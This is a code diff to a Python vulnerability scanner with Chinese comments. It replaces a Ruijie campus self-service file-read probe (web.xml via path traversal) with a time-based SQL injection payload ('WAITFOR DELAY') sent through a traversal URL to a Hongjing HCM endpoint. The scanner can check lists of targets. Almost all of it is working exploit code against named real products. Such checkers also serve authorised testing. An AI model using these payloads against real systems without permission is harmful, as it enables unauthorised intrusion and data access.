@@ -14,12 +14,23 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 def check_vulnerability(url):
     try:
         # 构造完整的攻击URL
-        attack_url = url.rstrip('/') + "/selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=%2e/WEB-INF/web.xml%3F"
-  
-        response = requests.get(attack_url, verify=False, timeout=10)
-  
-        if response.status_code == 200 and 'web-app' in response.text:
-            print(f"{RED}URL [{url}] 存在锐捷校园网自助服务系统login_judge任意文件读取漏洞{RESET}")
+        attack_url = url.rstrip('/') + "/templates/attestation/%2e%2e/%2e%2e/pos/roleinfo/pos_dept_post"
+        attack_payload = """usertable=h00&usernumber=1&i9999=-1';WAITFOR+DELAY+'0:0:6'--+"""
+        # attack_payload = {
+        #     "usertable": "h00",
+        #     "usernumber": "1",
+        #     "i9999": "-1';WAITFOR+DELAY+'0:0:6'--+"
+        # }
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+
+        start_time = time.time()
+        response = requests.post(attack_url, headers=headers, data=attack_payload, verify=False, timeout=10)
+        elapsed_time = time.time() - start_time
+
+        if 6 < elapsed_time < 8:
+            print(f"{RED}URL [{url}] 可能存在宏景HCM-pos_dept_post-delay-sql注入漏洞{RESET}")
         else:
             print(f"URL [{url}] 不存在漏洞")
     except requests.exceptions.Timeout:
@@ -28,7 +39,7 @@ def check_vulnerability(url):
         print(f"URL [{url}] 请求失败: {e}")
 
 def main():
-    parser = argparse.ArgumentParser(description='检测目标地址是否存在锐捷校园网自助服务系统login_judge任意文件读取漏洞')
+    parser = argparse.ArgumentParser(description='检测目标地址是否宏景HCM-pos_dept_post-delay-sql注入漏洞')
     parser.add_argument('-u', '--url', help='指定目标地址')
     parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')
 
